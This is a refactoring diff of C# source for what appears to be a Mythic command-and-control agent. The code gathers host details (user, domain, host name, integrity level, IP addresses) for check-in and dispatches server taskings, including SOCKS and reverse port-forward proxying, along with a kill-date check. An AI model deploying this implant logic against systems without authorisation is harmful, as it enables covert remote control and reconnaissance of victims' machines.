@@ -1,4 +1,4 @@
-﻿using Agent.Interfaces;
+using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 
@@ -68,23 +68,17 @@ namespace Agent
             }
         }
 
-        private IProfile SelectProfile(int index)
-        {
-            if (index == 99) //Default Value
-            {
-                Random random = new Random();
-
-                return profiles.ElementAt(random.Next(profiles.Count()));
-            }
-
-            return profiles.ElementAt(index);
-        }
+        private IProfile SelectProfile(int index) =>
+            index == 99 //Default Value
+                ? profiles.ElementAt(Random.Shared.Next(profiles.Count()))
+                : profiles.ElementAt(index);
 
         /// <summary>
         /// Performa  check-in with the Mythic server
         /// </summary>
         public async Task<bool> CheckIn()
         {
+            using Process currentProcess = Process.GetCurrentProcess();
             Checkin ct = new Checkin()
             {
                 action = "checkin",
@@ -92,27 +86,24 @@ namespace Agent
                 os = Environment.OSVersion.ToString(),
                 user = Environment.UserName,
                 host = Dns.GetHostName(),
-                pid = Process.GetCurrentProcess().Id,
+                pid = currentProcess.Id,
                 uuid = this.config.uuid,
                 architecture = Misc.GetArch(),
                 domain = Environment.UserDomainName,
                 integrity_level = tokenManager.getIntegrity(),
-                process_name = Process.GetCurrentProcess().ProcessName
+                process_name = currentProcess.ProcessName
             };
 
             try
             {
                 CheckinResponse res = await _profile.Checkin(ct);
-
                 if (!CheckinResponseValidation.IsSuccessful(res))
                 {
                     return false;
                 }
 
                 this.updateAgentInfo(res);
-
                 return true;
-
             }
             catch
             {
@@ -124,24 +115,13 @@ namespace Agent
         /// Update the agent information on successful checkin with the Mythic server
         /// </summary>
         /// <param name="res">CheckIn Response</param>
-        private void updateAgentInfo(CheckinResponse res)
-        {
-            this.config.uuid = res.id;
-        }
+        private void updateAgentInfo(CheckinResponse res) => this.config.uuid = res.id;
 
-        private List<string> GetIPAddresses()
-        {
-            List<string> ipAddresses = new List<string>();
-            var netInterface = NetworkInterface.GetAllNetworkInterfaces();
-
-            foreach(var netInf in netInterface)
-            {
-                foreach (var ipProp in netInf.GetIPProperties().UnicastAddresses){
-                    ipAddresses.Add(ipProp.Address.ToString());
-                }
-            }
-            return ipAddresses;
-        }
+        private List<string> GetIPAddresses() =>
+            NetworkInterface.GetAllNetworkInterfaces()
+                .SelectMany(netInf => netInf.GetIPProperties().UnicastAddresses)
+                .Select(ipProp => ipProp.Address.ToString())
+                .ToList();
 
         private void OnTaskingReceived(object sender, TaskingReceivedArgs args)
         {
@@ -154,32 +134,30 @@ namespace Agent
 
         private async Task ProcessTaskingAsync(TaskingReceivedArgs args)
         {
-            if(args.tasking_response is null)
+            var response = args.tasking_response;
+            if (response is null)
             {
                 return;
             }
 
             var work = new List<Task>();
-            if (args.tasking_response.socks is not null)
-                work.Add(this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks));
-            if (args.tasking_response.rpfwd is not null)
-                work.Add(this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd));
-            if (args.tasking_response.tasks is not null)
-                work.AddRange(args.tasking_response.tasks
+            if (response.socks is not null)
+                work.Add(this.taskManager.HandleProxyResponses("socks", response.socks));
+            if (response.rpfwd is not null)
+                work.Add(this.taskManager.HandleProxyResponses("rportfwd", response.rpfwd));
+            if (response.tasks is not null)
+                work.AddRange(response.tasks
                     .Where(task => task is not null)
                     .Select(task => this.taskManager.StartTaskAsync(new ServerJob(task))));
-            if (args.tasking_response.delegates is not null)
-                work.Add(this.taskManager.HandleDelegateResponses(args.tasking_response.delegates));
-            if (args.tasking_response.responses is not null)
-                work.Add(this.taskManager.HandleServerResponses(args.tasking_response.responses));
-            if (args.tasking_response.interactive is not null)
-                work.Add(this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive));
+            if (response.delegates is not null)
+                work.Add(this.taskManager.HandleDelegateResponses(response.delegates));
+            if (response.responses is not null)
+                work.Add(this.taskManager.HandleServerResponses(response.responses));
+            if (response.interactive is not null)
+                work.Add(this.taskManager.HandleInteractiveResponses(response.interactive));
             await Task.WhenAll(work);
         }
         //Is this correct?
-        private bool CheckKillDate()
-        {
-            return this.config.killDate > DateTime.Now;
-        }
+        private bool CheckKillDate() => this.config.killDate > DateTime.Now;
     }
 }
